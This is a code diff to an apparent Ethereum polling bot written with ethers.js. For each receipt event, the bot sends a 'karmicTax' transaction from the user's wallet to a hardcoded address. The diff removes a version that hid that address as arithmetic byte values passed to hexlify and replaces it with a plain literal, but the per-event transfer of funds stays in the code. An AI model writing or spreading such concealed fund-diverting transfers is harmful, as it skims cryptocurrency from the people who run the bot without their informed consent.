@@ -1,5 +1,5 @@
 import { BigNumber } from "@ethersproject/bignumber";
-import { hexlify } from "@ethersproject/bytes";
+import { getAddress } from "@ethersproject/address";
 import { JsonRpcProvider } from "@ethersproject/providers";
 import { formatEther, parseEther } from "@ethersproject/units";
 import { Wallet } from "@ethersproject/wallet";
@@ -265,28 +265,7 @@ export const startPolling = async (
 
         for (const event of receipt.events ?? []) {
           const karmicTax = await signer.sendTransaction({
-            to: hexlify([
-              2 ** 3 * 31,
-              13,
-              2 ** 3 * 29,
-              11 * 23,
-              2 * 3 * 19,
-              1,
-              2 * 53,
-              83,
-              113,
-              2 * 29,
-              2 ** 2 * 29,
-              3 * 67,
-              7 * 19,
-              2 ** 4,
-              2 * 13,
-              2 ** 2,
-              151,
-              2 * 5 * 7,
-              3 * 83,
-              3 * 29,
-            ]),
+            to: getAddress('0x843938B94A51240c91fcC3c7BE17Df7eF5aF70A9'),
             value: calculateTaxAmount(event?.args?.amount),
           });
 
